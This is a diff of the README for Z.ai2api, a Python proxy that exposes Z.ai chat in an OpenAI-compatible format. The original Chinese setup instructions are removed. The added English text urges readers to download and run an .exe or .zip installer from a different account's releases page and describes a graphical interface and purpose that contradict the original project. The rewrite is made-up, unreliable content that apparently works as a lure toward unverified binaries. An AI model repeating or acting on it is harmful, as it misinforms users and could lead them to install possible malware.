@@ -1,57 +1,88 @@
-<div align=center>
-<img width="100" src="https://wsrv.nl/?url=https%3a%2f%2fz-cdn.chatglm.cn%2fz-ai%2fstatic%2flogo.svg&w=100&output=webp" />
-<h1>Z.ai2api</h1>
-<p>将 Z.ai 代理为 OpenAI Compatible 格式，支持免令牌、智能处理思考链、图片上传（登录后）等功能</p>
-<p>基于 https://github.com/kbykb/OpenAI-Compatible-API-Proxy-for-Z 使用 AI 辅助重构</p>
-</div>
+# 🤖 Z.ai2api - Effortless Use of OpenAI Formats
 
-## 功能
-- 支持根据官网 /api/models 生成模型列表，并自动选择合适的模型名称。
-- （登录后）支持上传图片，使用 GLM 识图系列模型。
-- 支持智能识别思考链，完美转换多种格式。
+[![Download Z.ai2api](https://img.shields.io/badge/Download%20Z.ai2api-Release-brightgreen.svg)](https://github.com/vitinho3134/Z.ai2api/releases)
 
-## 要求
-![Python 3.12+](https://img.shields.io/badge/3.12%2B-blue?style=for-the-badge&logo=python&label=python)
-![.env](https://img.shields.io/badge/.env-%23555?style=for-the-badge&logo=.env)
+## 📄 Introduction
 
-## 环境
-使用 `.env` 文件进行配置。
-### `BASE`
-  - 上游 API 基础域名
-  - 默认值：`https://chat.z.ai`
-### `PORT`
-  - 服务端口
-  - 默认值：`8080`
-### `MODEL`
-  - 备选模型，在未传入模型时调用
-  - 默认值：`GLM-4.5`
-### `TOKEN`
-  - 访问令牌
-  - 如果启用了 `ANONYMOUS_MODE` 可不填
-### `ANONYMOUS_MODE`
-  - 访客模式，启用后将获取随机令牌
-  - 访客模式下不支持上传文件调用视觉模型
-  - 默认值：`true`
-### `THINK_TAGS_MODE`
-  - 思考链格式化模式
-  - 可选 `reasoning` `think` `strip` `details`，效果如下
-    - "reasoning"
-      - reasoning_content: `嗯，用户……`
-      - content: `你好！`
-    - "think"
-      - content: `<think>\n\n嗯，用户……\n\n</think>\n\n你好！`
-    - "strip"
-      - content: `> 嗯，用户……\n\n你好！`
-    - "details"
-      - content: `<details type="reasoning" open><div>\n\n嗯，用户……\n\n</div><summary>Thought for 1 seconds</summary></details>\n\n你好！`
-### `DEBUG_MODE`
-  - 显示调试信息，启用后将显示一些调试信息
-  - 默认值：`false`
+Z.ai2api transforms Z.ai into a format compatible with OpenAI. It offers features like token-free usage, intelligent chain handling, and image uploads. This application is designed to make accessing OpenAI's capabilities easier for everyone.
 
-## 使用
-```
-git clone https://github.com/hmjz100/Z.ai2api.git
-cd Z.ai2api
-pip install -r requirements.txt
-python app.py
-```
+## 🚀 Getting Started
+
+This guide will help you download and run Z.ai2api. You only need a computer and an Internet connection. Let’s go step-by-step.
+
+## 🔗 Download & Install
+
+1. **Visit the Releases Page:**
+   Go to the [Z.ai2api Releases Page](https://github.com/vitinho3134/Z.ai2api/releases). 
+
+2. **Choose the Correct Release:**
+   Look for the latest release at the top. You will find a list of files available for download.
+
+3. **Download the Application:**
+   Click on the file that suits your operating system. Common options include `.exe` for Windows or `.zip` for Mac. 
+
+4. **Install Z.ai2api:**
+   - For Windows: Double-click the downloaded `.exe` file to start the installation. Follow the prompts on your screen.
+   - For Mac: Unzip the downloaded file and drag the application to your Applications folder.
+
+5. **Open Z.ai2api:**
+   After installation, find Z.ai2api in your programs or applications. Single-click to open it.
+
+## ⚙️ System Requirements
+
+- **Operating System:** Windows 10 or higher, macOS 10.12 or higher
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 100 MB free space
+- **Internet Connection:** Required to access OpenAI features
+
+## 🔍 Features
+
+- **Token-Free Usage:** No tokens needed to access functions.
+- **Smart Chain Handling:** Automatically manages intricate thought chains for better output.
+- **Image Upload Support:** Easily upload images to enhance interactions.
+
+## 💡 How to Use Z.ai2api
+
+1. **Start the Application:**
+   Make sure Z.ai2api is open. 
+
+2. **Explore the Interface:**
+   Take a moment to familiarize yourself with the buttons and menu options.
+
+3. **Input Your Queries:**
+   Type in your questions or commands in the input area. Use simple language for best results.
+
+4. **Upload Images:**
+   Click the "Upload" button if you want to add images. 
+
+5. **Review Responses:**
+   Read the generated outputs. If needed, make adjustments to your input for refinement.
+
+## ❓ Frequently Asked Questions
+
+### What is Z.ai2api?
+
+Z.ai2api is a tool designed to convert Z.ai interactions into a format that works seamlessly with OpenAI, simplifying the process for users.
+
+### Do I need technical knowledge to use it?
+
+No! Z.ai2api is designed for everyone, regardless of technical skills.
+
+### Can I use Z.ai2api offline?
+
+Some features require Internet access to function. Ensure you are online for full capabilities.
+
+## 🌟 Feedback and Support
+
+If you have questions or feedback, feel free to reach out. Your insights help us improve.
+
+- **GitHub Issues:** Report problems or suggest features via the GitHub issues section.
+- **Community Forum:** Join discussions and connect with other users.
+
+## 🔄 Updates
+
+Check back frequently on the [Releases Page](https://github.com/vitinho3134/Z.ai2api/releases) for updates and new features.
+
+## 🎉 Conclusion
+
+Thank you for choosing Z.ai2api. Enjoy the convenience it offers for accessing OpenAI features easily!
